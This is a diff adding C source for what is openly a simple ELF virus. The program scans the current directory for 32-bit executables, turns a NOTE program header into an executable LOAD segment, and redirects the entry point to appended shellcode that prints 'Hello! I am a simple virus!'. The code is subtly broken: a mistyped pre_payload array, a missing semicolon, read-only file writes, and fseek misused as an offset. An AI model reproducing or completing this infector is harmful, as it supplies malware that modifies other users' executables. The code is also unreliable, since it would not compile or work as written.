@@ -1,0 +1,105 @@
+#include <dirent.h> 
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <elf.h>
+
+char payload [] = {	
+	0xEB, 0x21, 0x8B, 0x3C, 0x24, 0x8B, 0x34, 0x24, 0x83, 0xEE, 0x06, 0x29, 
+	0xC0, 0x29, 0xDB, 0x29, 0xD2, 0xB0, 0x04, 0xB3, 0x01, 0x89, 0xF9, 0xB2,
+	0x1C, 0xCD, 0x80, 0x29, 0xC0, 0x29, 0xDB, 0xB0, 0x01, 0xCD, 0x80, 0xE8,
+	0xDA, 0xFF, 0xFF, 0xFF, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x21, 0x20, 0x49,
+	0x20, 0x61, 0x6D, 0x20, 0x61, 0x20, 0x73, 0x69, 0x6D, 0x70, 0x6C, 0x65,
+	0x20, 0x76, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0A, 0x00
+};
+
+#define DEBUG 1
+
+int main(int argc, char ** argv){
+	FILE *fp;
+	DIR *d;
+	struct dirent *dir;
+	char magic_word[] = {0x7f, 0x45, 0x4C, 0x46}; //DEL,E,L,F
+
+		
+	char pre_payload = {
+		0x50, 0x53, 0x51, 0x52, 0x56, 0x57,
+		0xe8, ".", ".", ".", ".",
+		0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58,
+		0xe9, ".", ".", ".", "."
+	}
+
+
+	int pre_payload_size = sizeof(pre_payload)/sizeof(pre_payload[0]);
+	int payload_size = sizeof(payload)/sizeof(payload[0]);
+
+	Elf32_Ehdr * header = malloc(sizeof(Elf32_Ehdr));//ELF Header
+	d = opendir(".");
+	if(d) {
+		//if directory exists
+		int found_infectable_file = 0;
+		while((dir = readdir(d)) != NULL){
+			//loop over all files in directory
+			fp = fopen(dir->d_name,"r");
+			if(fp!=NULL){
+				fread(header,sizeof(Elf32_Ehdr),1,fp);
+				if(strncmp(header->e_ident,magic_word,4) == 0 && header->e_type == 2){
+					printf("%s \t%s \t%d \t%x\n",dir->d_name,header->e_ident,header->e_type, header->e_entry);
+					Elf32_Addr old_entry_point = header->e_entry; //store old entry point
+
+					//prepare loop
+					Elf32_Phdr phdr;//program header table
+					int objectsread;
+					int numloadsegments;
+					int payload_offset, payload_address;
+					int adjustment;
+
+					int i;
+					if(DEBUG)printf("Looking for NOTE header\n");
+					for(i = 0 ; i < header->e_phnum ; i++){
+						objectsread = fread(&phdr, sizeof(Elf32_Phdr), 1, fp);
+						if(phdr.p_type == PT_NOTE){
+							if(DEBUG)printf("Found NOTE program header\n");
+							found_infectable_file = 1;
+				
+							//calculate new offset for our code
+							payload_offset = fseek(fp, 0, SEEK_END);//offset to end of file, where our code is
+							phdr.p_offset = payload_offset;
+							payload_address = 0x08048000 - (payload_size + pre_payload_size);
+							//???
+							adjustment = payload_offset % 0x1000 - payload_address % 0x1000;
+							if(adjustment>0)payload_address -= 0x1000;
+							payload_address += adjustment;
+							//set the new jump point where our code is
+							header->e_entry = payload_address;
+	
+							//modify NOTE section to a LOAD section
+							phdr.p_type = PT_LOAD;
+							phdr.p_vaddr = phdr.p_addr = payload_address;
+							phdr.p_filesz = phdr.p_memsz = payload_size + pre_payload_size;
+							phdr.p_flags = PF_R | PF_X;
+							phdr.p_align = 0x1000;
+							
+							//write new phdr to storage
+							fseek(fp, header->e_phoff + i*header->e_phentsize, SEEK_SET);
+							fwrite (phdr, sizeof(Elf32_Phdr) , 1 , fp);
+						}
+					}
+				}
+				//closing file again
+				fclose(fp);
+				if(found_infectable_file){
+					break;
+				}else{	
+					printf ("Could not infect file");
+				}
+			}
+		}
+	}
+	closedir(d);
+
+	return 0;
+}
+
+
